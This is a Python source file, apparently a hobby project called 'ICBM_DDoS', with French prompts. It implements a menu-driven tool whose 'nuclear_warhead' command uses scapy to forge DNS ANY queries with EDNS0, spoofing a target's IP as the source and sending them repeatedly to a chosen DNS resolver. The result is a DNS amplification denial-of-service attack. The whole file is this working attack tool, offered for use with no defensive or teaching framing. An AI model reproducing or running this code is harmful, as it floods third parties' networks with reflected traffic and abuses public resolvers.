import os
import json
from scapy.all import IP, UDP, DNS, DNSQR, EDNS0, send


def search_element(key):
    with open(os.path.join("ICBM_DDoS", "data.json"), "r") as f:
        data = json.load(f)
    return data.get(key)

def write_element(key, new_value):
    path = os.path.join("ICBM_DDoS", "data.json")
    with open(path, "r") as f:
        data = json.load(f)
    data[key] = new_value
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

# --- Texte d’aide ---
help1 = """
Bienvenue dans le WARMODE space cowboy !!!

Liste des commandes :

    help
        ---> Affiche ce message

    /exit
        ---> Quitte le programme

    nuclear_warhead <ip_cible> <ip_dns> <nb_attaques>
        ---> Envoie une requête DNS 

"""


def init_security():
    if search_element("open") == 1:
        secu = input("Insérez votre code de sécurité : ")
        if secu == search_element("security"):
            return True
        else:
            print("Mauvais code")
            return False
    elif search_element("open") == 0:
        print("Veuillez paramétrer un code de sécurité pour lancer le WARMODE")
        user_enter = input("Code de sécurité : ")
        write_element("security", user_enter)
        write_element("open", 1)
        return True
    else:
        print("Erreur dans data.json")
        return False

def nuclear_warhead(ip_target, ip_dns, nb_attack):
    try:
        edns_opt = EDNS0(rclass=4096)
        paquet_ip = IP(src=ip_target, dst=ip_dns)
        paquet_udp = UDP(dport=53)
        requete_dns = DNS(rd=1,
                          qd=DNSQR(qname="google.com", qtype="ANY"),
                          ar=edns_opt,
                          qdcount=int(nb_attack))
        for _ in range(int(nb_attack)):
            paquet_final = paquet_ip / paquet_udp / requete_dns
            send(paquet_final, verbose=0)
        print(f"[OK] Missile envoyé vers {ip_target} via {ip_dns} ({nb_attack} fois)")
    except Exception as e:
        print(f"[ERREUR] {e}")


def main():
    if not init_security():
        return

    print("Bienvenue dans le WARMODE 🚀")
    while True:
        user_enter = input(">>> ").split()
        if not user_enter:
            continue

        cmd = user_enter[0]

        if cmd == "help":
            print(help1)

        elif cmd == "/exit":
            print("Fermeture du WARMODE...")
            break

        elif cmd == "nuclear_warhead" and len(user_enter) == 4:
            ip_target = user_enter[1]
            ip_dns = user_enter[2]
            nb_attack = user_enter[3]
            nuclear_warhead(ip_target, ip_dns, nb_attack)

        else:
            print("Commande inconnue. Tapez 'help' pour la liste.")

if __name__ == "__main__":
    main()